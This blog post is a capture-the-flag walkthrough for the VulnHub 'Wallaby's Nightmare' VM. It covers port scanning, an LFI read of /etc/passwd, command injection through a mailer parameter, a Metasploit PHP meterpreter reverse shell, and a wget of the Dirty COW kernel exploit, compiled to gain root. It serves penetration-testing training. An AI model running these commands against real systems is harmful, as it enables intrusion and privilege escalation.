<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Nightmare VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-nightmare-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-04-12T17:25:32+00:00">April 12, 2017</time><time class="updated" datetime="2025-06-10T20:30:14+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve Wallaby‚Äôs Nightmare CTF which is a new VM challenge of vulnhub where the attacker has to achieve root flag of the targeted VM machine; you can download it from <a style="color: #000000;" href="https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/"><strong>here</strong></a>.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning (Netdiscover, Nmap)</span></li>
<li><span style="color: #000000;">Abusing HTTP service for LFI Vulnerability</span></li>
<li><span style="color: #000000;">Web Directory Enumeration (Dirb)</span></li>
<li><span style="color: #000000;">Exploiting RCE (Metasploit)</span></li>
<li><span style="color: #000000;">Kernel Privilege Escalation</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let‚Äôs Begin!</strong></span></p>
<p><span style="color: #000000;">As we always start from the network so that we can have a target IP. In your Kali Linux open the terminal and type <strong>netdiscover</strong>, now from the screenshot you can see a list of IP. Here <strong>192.168.0.101</strong> is my target IP.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-K3xqr9lzIGc/WO5gK8cjXWI/AAAAAAAAPx0/-UgfXLVNmic4NWH-snwybWEm8I1JFhEUwCLcB/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Enumerate the target through aggressive scan; type following command for nmap scanning:</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.0.101</pre>
<p><span style="color: #000000;">So here I found three¬†<strong>ports 22, 80, 6667</strong>¬†are¬†<strong>open.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ffD01Tu8JPE/WO5gM-E2-tI/AAAAAAAAPyg/qREeolhb8-gsn-IHTvtsqXBt2vDFjyxSACLcB/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Since port 80 is open I look toward browser and explore target IP 192.168.0.101 where I found a comment ‚Äú<strong>enter a username to get started with this CTF</strong>‚Äù then I type the name ‚Äú<strong>RAJ</strong>‚Äù and click on <strong>submit</strong> so that we could move forward into start the game.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-4tDv_yP2Ijw/WO5gMroSuhI/AAAAAAAAPyY/JcaOtYrd7e4rw3yOMKa8UV-y3nVGwVHNwCLcB/s1600/3.png"/></span></p>
<p><span style="color: #000000;">When I clicked on submit tab is linked to next web page where you can read the assigned username for this CTF from screenshot now we can start this CTF when we will click on given link <strong>start the CTF!</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ILLt7dFTRZY/WO5gM0WlpMI/AAAAAAAAPyc/zLV-k-_R4Akz5wN5a6MYHJXF0cw0ONykwCLcB/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Next web page open with <strong>an exclusive warning</strong> that Mr. Wallaby found raj is trying to penetrate inside the server so user ‚Äúraj‚Äù is under his observation. Then soon after reading this threat, I observe at its URL I thought it might be vulnerable to <strong>etc/passwd</strong> same as LFI attack.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-KaDcXWyRTkQ/WO5gNDhV6hI/AAAAAAAAPyk/Bn-hzYCuJu4isXDFZGap2lO04BIzSHuwQCLcB/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Then I try browse following in URL <strong>192.168.1.101/?page=/etc/passwd </strong>though the web page stands up with raw data nothing was quite useful on this web page. And when I refresh it I lose connection from port 80. As raj was threatened by Wallaby üòâ¬†</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OIEhB0m23Y4/WO5gNVCG1jI/AAAAAAAAPyo/SWX-HC0pGAAy1Nr6D_OpF_xTsRYcIENbACLcB/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Again I move toward <strong>nmap</strong> so that I can make sure about port 80 but here I found a new <strong>port 60080</strong> is open for http service as you can perceive this thing from the given screenshot.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5Z07WfAsf2I/WO5gNboUMhI/AAAAAAAAPys/HXnHa75-qkcaq-brHeGnjtMiW_A6puLdgCLcB/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Then I next to my next tool dirb</span></p>
<pre class="lang:default decode:true">dirb http://192.168.0.101:60080/?page=</pre>
<p><span style="color: #000000;">Now from the screenshot, you can see the result and currently we will look toward highlighted directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gKrrhmQ2Fj4/WO5gN8as_8I/AAAAAAAAPyw/xy3neeAibiAHzSqybNBcpopCecMg6Vi9wCLcB/s1600/8.png"/></span></p>
<p><span style="color: #000000;">So when I browse <strong>192.168.0.101:60080/?page=mailer</strong> in URL the resultant web page gets opened and I found nothing special here except ‚Äú<strong>coming soon, guys!</strong>‚Äù</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-MuQlp02JB78/WO5gNyXnrxI/AAAAAAAAPy0/T-ZHK9VF-p0EcUdhanFocJPRMfAcvX25QCLcB/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Then I look after page source code to get some clue, here inside HTML code the anchor tag contains a link for another file which you can see from the screenshot.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ZdlmYZ9JaEU/WO5gKy-VDjI/AAAAAAAAPx8/YYFapnROHgMB09tyLWZnYy5sFDPYRZpAwCLcB/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Again I browse above highlighted text <strong>192.168.0.101:60080/?mailer&amp;mail=pwd </strong>in URL and the web page comes outside with <strong>/var/www/html</strong></span></p>
<p><span style="color: #000000;">Hence we can say that the current page might good for executing malicious comment as a command. ¬†</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-VhXGFfNB4mM/WO5gK6XVd-I/AAAAAAAAPx4/YJZ-S1FvQKUHdlwVSzwHlxgi41q__OWxQCLcB/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now load Metasploit framework to connect with the victim through reverse connection</span></p>
<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
msf exploit¬†(web_delivery)&gt;set¬†target 1
msf exploit¬†(web_delivery)&gt;set payload php/meterpreter/reverse_tcp
msf exploit¬†(web_delivery)&gt;set lhost 192.168.0.106
msf exploit¬†(web_delivery)&gt;set lport 4444
msf exploit¬†(web_delivery)&gt;exploit</pre>
<p><span style="color: #000000;">Now¬†<strong>copy</strong>¬†the generated command¬†<strong>php‚Ä¶.UvrG‚Äô));‚Äù</strong>¬†and send it to target</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0zW5qKAAqvo/WO5gLqo7ylI/AAAAAAAAPyE/BDWyLdwO2eAUqAqHR8Jhx4CtJXL8irqegCLcB/s1600/12.png"/></span></p>
<p><span style="color: #000000;">From the screenshot, you can see I have <strong>pasted</strong> above malicious PHP comment inside URL in hope to get a reverse connection inside Metasploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-RABdTYGYA9g/WO5gLX8ryCI/AAAAAAAAPyA/mKgMxHsDf40FU3MIJZkA68iTmf0oF3pvQCLcB/s1600/13.png"/></span></p>
<p><span style="color: #000000;">So when I execute this comment I receive <strong>meterpreter session</strong> and get connected with victim shell</span></p>
<pre class="lang:default decode:true">meterpreter&gt; sysinfo
meterpreter&gt; shell</pre>
<p><span style="color: #000000;"><code><img decoding="async" src="https://3.bp.blogspot.com/-j0qtEnV9DGs/WO5gLnyPHaI/AAAAAAAAPyI/CTpPK-j_P2At_TWmBvq4KsOTXUNHTwhFwCLcB/s1600/14.png"/></code></span></p>
<p><span style="color: #000000;">Now use <strong>‚ÄúDirty cow exploit‚Äù</strong> therefore type the following command to download this exploit inside tmp folder of the victim.</span></p>
<pre class="lang:default decode:true">wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-MAR7YMl4O-A/WO5gMJ80WVI/AAAAAAAAPyM/e7D2kewDChsAs2q4TzsAKyGutk4PEoELgCLcB/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now type the following command to compile your exploit so that it can run successfully inside.</span></p>
<pre class="lang:default decode:true">gcc cowroot.c ‚Äìo cowroot -pthread</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-xuyRZ8Ld8uQ/WO5gMLfDUYI/AAAAAAAAPyQ/MUaWPq2aXzIdtGucUF_69mP9Avvk9t5YACLcB/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now we can run our exploit to achieve <strong>root permission</strong> and try to capture the flag</span></p>
<pre class="lang:default decode:true">./cowroot
id
cd /root
ls
cat flag.txt</pre>
<p><span style="color: #000000;"><strong>Congratulation!!!</strong><strong>¬†</strong>We have captured the flag which you can see from the screenshot and beat this task‚Ä¶‚Ä¶‚Ä¶..</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-bFZ1FjK9anY/WO5gMT8Lb-I/AAAAAAAAPyU/dSS3SZEwzqoTDJkUv_GhGftULRYTayBkgCLcB/s1600/17.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
